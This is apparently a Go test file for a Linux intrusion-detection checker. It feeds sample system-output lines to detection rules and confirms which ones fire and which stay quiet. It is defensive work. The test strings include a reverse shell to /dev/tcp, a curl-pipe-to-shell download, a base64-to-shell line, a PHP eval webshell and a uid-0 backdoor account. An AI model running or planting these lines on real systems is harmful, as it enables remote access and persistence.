package linux

import (
	"slices"
	"testing"

	"karma/internal/testkit"
)

// Rule hits for the catalog: each case feeds one line shaped like real target
// output and names the rule that must light. Cases with want as a negative rule
// lock the exclusions (the rules written around RE2's missing lookaround).
func TestLinuxCheckRules(t *testing.T) {
	cases := []struct {
		check string
		text  string
		want  string
	}{
		{"env", `LD_PRELOAD=/tmp/preload.so`, "env-ld-preload"},
		{"env", `PATH=/usr/local/bin:/usr/bin:`, "env-path-dot"},
		{"env", `PYTHONPATH=/tmp/evil`, "env-python-path"},
		{"accounts", `backdoor:x:0:0::/:/bin/sh`, "acct-other-uid0"},
		{"accounts", `mysql:x:997:997::/var/lib/mysql:/bin/bash`, "acct-login-shell"},
		{"shadow", `root::18900:0:99999:7:::`, "shadow-empty-root"},
		{"shadow", `svc::18900:0:99999:7:::`, "shadow-empty"},
		{"groups", `sudo:x:27:alice`, "group-privileged"},
		{"groups", `backup:$6$salt$hash:18900:0:99999:7:::`, "group-password"},
		{"sudoers", `alice ALL=(ALL) NOPASSWD: ALL`, "sudo-nopasswd"},
		{"authorized-keys", `command="/tmp/s" ssh-ed25519 AAAA comment`, "authkeys-force-command"},
		{"sshd-config", `PermitRootLogin yes`, "sshd-permit-root-login"},
		{"sshd-config", `AuthorizedKeysFile .ssh/keys`, "sshd-authorized-keys-file"},
		{"sshd-config", `PasswordAuthentication yes`, "sshd-password-auth"},
		{"ssh-client-config", `ProxyCommand nc -x 10.0.0.8:1080 %h %p`, "ssh-client-proxy-command"},
		{"ps", `www-data  1234  0.0  0.1  1360  580 pts/0  Ss  /bin/sh`, "ps-service-shell"},
		{"ps", `curl http://10.0.0.8/x.sh | sh`, "download-to-shell"},
		{"ps", `bash -i >& /dev/tcp/10.0.0.8/4444`, "shell-interactive"},
		{"listen", `ESTAB 0 0 10.0.0.5:22 5.6.7.8:4444 users:(("python",pid=1234))`, "net-interpreter-socket-ss"},
		{"deleted-exe", `/proc/1234/exe -> /tmp/.x (deleted)`, "deleted-binary"},
		{"deleted-exe", `sleep 2686147 root 0r REG 0,36 4 0 21655 /tmp/karma-del-test (deleted)`, "deleted-binary"},
		{"hidden-procs", `1234`, "proc-not-in-ps"},
		{"cwd-tmp", `/proc/1234 -> /tmp/.x`, "proc-cwd-tmp"},
		{"firewall", `-A INPUT -p tcp --dport 22 -j ACCEPT`, "firewall-active"},
		{"tcp-wrappers", `sshd: ALL: spawn /tmp/x`, "wrappers-exec"},
		{"hosts-file", `10.0.0.8 evil.corp`, "hosts-nonlocal"},
		{"mounts", `//10.0.0.8/share /mnt/data cifs rw`, "mount-remote-fs"},
		{"services", `evil.service loaded auto-restart running`, "unit-crashloop"},
		{"cron", `@reboot /tmp/.x`, "cron-reboot"},
		{"cron", `*/1 * * * * /tmp/.x`, "cron-every-minute"},
		{"rc-local", `base64 -d ZwAh | sh`, "rc-b64-shell"},
		{"ld-preload", `/tmp/.preload.so`, "preload-entry"},
		{"shell-rc", `HISTFILE=/dev/null`, "history-off"},
		{"history", `history -c`, "history-clear"},
		{"tmp-listing", `-rw-r--r-- 1 root root 4096 Jun  1 10:00 .backdoor`, "tmp-hidden-entry"},
		{"key-dirs", `-rw------- 1 root root 1679 Jun  1 10:00 /root/.ssh/authorized_keys`, "ssh-material"},
		{"key-dirs", `drwxr-xr-x 1 root root 4096 Jun  1 10:00 /opt/chisel`, "tunnel-tool"},
		{"suid", `/home/deploy/find`, "suid-gtfobins"},
		{"sgid", `/home/deploy/find`, "sgid-gtfobins"},
		{"web-dirs", `/var/www/html/shell.php`, "web-script"},
		{"webshell-grep", `<?php @eval($_POST['c']); ?>`, "webshell-direct"},
		{"caps", `/usr/bin/x cap_setuid=ep`, "caps-setuid"},
		{"pkg-verify", `??5?????? c /etc/hosts`, "pkg-checksum"},
		{"pkg-verify", `/usr/sbin/sshd: ASCII text`, "bin-not-elf"},
		{"pkg-history", `2025-06-01 10:20 install nginx:amd64 <none> 1.18.0`, "pkg-changed"},
		{"pkg-history", `Commandline: apt-get install -y nginx`, "pkg-apt-record"},
		{"modules-load", `evil_module`, "modules-boot-entry"},
		{"modules-hidden", `HIDDEN rootkit`, "module-hidden"},
		{"module-files", `-rw-r--r-- 1 root root 184320 Jun  1 10:00 rc_kernel.ko`, "module-files-out-of-tree"},
		{"tainted", `64`, "kernel-tainted"},
		{"module-sig-config", `CONFIG_MODULE_SIG=n`, "module-sig-off"},
		{"dmesg", `[    0.000000] module verification failed: taint flag set`, "dmesg-taint"},
		{"log-dirs", `-rw-r----- 1 www adm 0 Jun  1 10:00 access.log`, "logdir-middleware"},
	}

	for _, tc := range cases {
		check := testkit.CheckByID(t, All, tc.check)
		if !slices.Contains(testkit.HitIDs(t, tc.text, check), tc.want) {
			t.Errorf("%s should light %s: %q", tc.check, tc.want, tc.text)
		}
	}
}

// The exclusions carry the other half of the precision: these lines must stay quiet.
func TestLinuxRuleExclusions(t *testing.T) {
	cases := []struct {
		check string
		text  string
		quiet string
	}{
		{"accounts", `root:x:0:0:root:/root:/bin/bash`, "acct-other-uid0"},
		{"shadow", `root:!:18900:0:99999:7:::`, "shadow-empty-root"},
		{"sshd-config", `PermitRootLogin no`, "sshd-permit-root-login"},
		{"hosts-file", `127.0.0.1 localhost`, "hosts-nonlocal"},
		{"env", `PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`, "env-path-dot"},
		{"pkg-verify", `..5?????? c /etc/hosts`, "bin-not-elf"},
	}
	for _, tc := range cases {
		check := testkit.CheckByID(t, All, tc.check)
		if slices.Contains(testkit.HitIDs(t, tc.text, check), tc.quiet) {
			t.Errorf("%s must stay quiet on: %q (%s)", tc.check, tc.text, tc.quiet)
		}
	}
}
